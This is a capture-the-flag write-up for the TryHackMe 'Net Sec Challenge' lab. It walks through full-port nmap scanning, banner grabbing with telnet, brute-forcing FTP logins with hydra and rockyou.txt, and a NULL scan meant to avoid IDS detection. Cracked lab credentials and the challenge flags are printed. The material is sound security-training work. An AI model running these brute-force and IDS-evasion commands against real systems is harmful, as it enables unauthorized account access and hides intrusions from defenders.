## Introduction 

This room focuses on gathering information, brute-forcing, and exploiting services using tools like Nmap, Hydra and Telnet. The difficulty level of this room is **Medium**, and the goal is enumerate open ports and capture the flags. This room is from the popular platform called TryHackMe. You can find the link to the room at the end of the writeup. 


## Objectives

- Find the highest port number below 10,000.
- Find the open port outside the common 1000 ports which is above 10,000.
- Find how many TCP ports are open.
- Capture the flag hidden in the HTTP server header.
- Capture the flag hidden in the SSH server header.
- Find the version of the FTP server which uses a non-standard port.
- Capture the flag which in the account files of 'eddie' and 'quinn'
- Capture the flag on the challenge located on http://MACHINE_IP:8080


## Enumeration

### Port Scanning (Nmap)

Firstly, we need to gather detailed information about open ports. I will use the following command:

`sudo nmap -sS -p- -Pn 10.114.136.193`

Let me explain why I chose these flags. 
- `-sS` - SYN scan, also known as a "stealth scan". It is faster than `-sT` which uses a full TCP connection. Unlike `-sT`, `-sS` never complete the handshake, making it less noticeable. Note that this flag requires root privileges. 
- `-p-` - Scans all 65,535 ports instead of just the default 1,000. This is important since one of our objective is to find open port above 10,000.
- `-Pn` - Skips host discovery (ping). Since we already know the host is alive, this saves us time.

```bash
❯ sudo nmap -sS -p- -Pn 10.114.136.193 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 22:08 +0500
Nmap scan report for 10.114.136.193
Host is up (0.100s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 345.50 seconds
```

From the scan results we can see that **6 TCP ports** are open in total. The highest port below 10,000 is **8080**, and there is also one non-standard port above 10,000 - **10021**.

Since we found a non-standard port used by FTP server, we can target only this port to get the FTP server version, saving us time.

`sudo nmap -sS -p 10021 -sV 10.114.136.193`

```bash
❯ sudo nmap -sS -p 10021 -sV 10.114.136.193
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 22:26 +0500
Nmap scan report for 10.114.136.193
Host is up (0.10s latency).

PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.5
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds

```

The scan reveals that the FTP server is running vsftpd 3.0.5 on a Unix system.

### Banner Grabbing (Telnet)

To grab the HTTP and SSH banners, we will use Telnet.

Let's start with the HTTP server on port 80.
```bash
❯ telnet 10.114.136.193 80
Trying 10.114.136.193...
Connected to 10.114.136.193.
Escape character is '^]'.
GET / HTTP/1.1 
host: altiera

HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "229449419"
Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
Content-Length: 226
Date: Wed, 18 Mar 2026 17:40:30 GMT
Server: lighttpd THM{web_server_25352}

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Hello, world!</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
</head>
<body>
  <h1>Hello, world!</h1>
</body>
</html>
Connection closed by foreign host.
```

To retrieve the HTTP headers, we send a basic HTTP request manually. We use `GET / HTTP/1.1` to request the root page. The host field is required by HTTP/1.1 protocol, but its value doesn't matter here, we just need to satisfy the protocol requirement to get a response. 

Now let's grab the SSH server banner.

```bash
❯ telnet 10.114.136.193 22
Trying 10.114.136.193...
Connected to 10.114.136.193.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{946219583339} 
```

Getting the flag from the SSH header is simpler than HTTP. We connected to port 22 and the flag was immediately revealed in the banner upon connection.

### Brute force (Hydra)

We have two users `eddie` and `quinn`, and we need to capture the flag from one of their account files accessible via FTP. I will use Hydra to brute-force their passwords with the `rockyou.txt` wordlist, which is one of the most common and popular wordlists.

Let's break down the command syntax first:

`hydra -l USER -P WORDLIST IP_ADDRESS PROTOCOL -s PORT`

- `-l` — single username
    
- `-P` — path to the wordlist
    
- `IP_ADDRESS` — target IP address
    
- `PROTOCOL` — `ftp` in our case, since the files are accessible via FTP
    
- `-s` — non-standard port, which is `10021` based on our scan results

1. For `eddie`:
```bash
❯ hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.114.136.193 ftp -s 10021
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-18 23:01:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.114.136.193:10021/
[10021][ftp] host: 10.114.136.193   login: eddie   password: jordan
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-18 23:01:16
```
2. For `quinn`:
```bash
❯ hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.114.136.193 ftp -s 10021
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-18 23:01:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.114.136.193:10021/
[10021][ftp] host: 10.114.136.193   login: quinn   password: andrea
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-18 23:01:33
```

We successfully obtained both passwords `eddie:jordan` and `quinn:andrea`. Now let's connect to the FTP server and find the flag.

After gaining the passwords, we can now connect to the FTP server. Make sure to specify port 10021 since it uses a non-standard port.

User `eddie` has an empty directory, so we switch to `quinn`. After logging in and running `ls`, we can see a file called `ftp_flag.txt`. We download it using the `get` command and read it locally. 

```bash
❯ ftp 10.114.136.193 10021
Connected to 10.114.136.193.
220 (vsFTPd 3.0.5)
Name (10.114.136.193:altiera): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30617|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30640|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |*******************************************************************************************************************************|    18       22.68 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.17 KiB/s)
ftp> bye
221 Goodbye.
❯ cat ftp_flag.txt
THM{321452667098}
```
The flag was found in quinn's account — THM{321452667098}.
### Challenge (port 8080)

The last task is a challenge hosted at `http://10.114.136.193:8080`. The goal is to scan the target as covertly as possible without being detected by the IDS. The page tracks how suspicious our scan looks and shows the detection chance as a percentage, we need to keep it at 0%.

I used the following command:
`sudo nmap -sN -Pn 10.114.136.193`

- `-sN` — NULL scan, sends packets with no flags set. This makes it much harder for IDS to detect compared to a regular SYN scan.
    
- `-Pn` — skips host discovery since we already know the host is alive.

![[Pasted image 20260318234603.png]]

After running the scan the page showed **0% chance of detection** and revealed the flag.

![[Pasted image 20260318234511.png]]

## Conclusion 

In this room I practiced three essential penetration testing tools — Nmap, Hydra, and Telnet. I learned various Nmap scan types and when to use each flag depending on the situation, for example skipping host discovery with `-Pn` when we already know the host is alive, or using `-sS` for a faster and stealthier SYN scan instead of a full TCP connection.

An important takeaway is that services don't always run on their default ports — the FTP server in this room was running on port 10021 instead of the standard port 21. This is a reminder to always scan all ports with `-p-` rather than relying on default port assumptions.

I also learned how to use Hydra to brute-force credentials and how banner grabbing with Telnet can reveal sensitive information hidden in server headers. The most interesting part was performing a covert NULL scan (`-sN`) to avoid IDS detection, it showed me that *how* you scan matters just as much as *what* you scan.

## Links 

[TryHackMe - Net Sec Challenge](https://tryhackme.com/room/netsecchallenge)
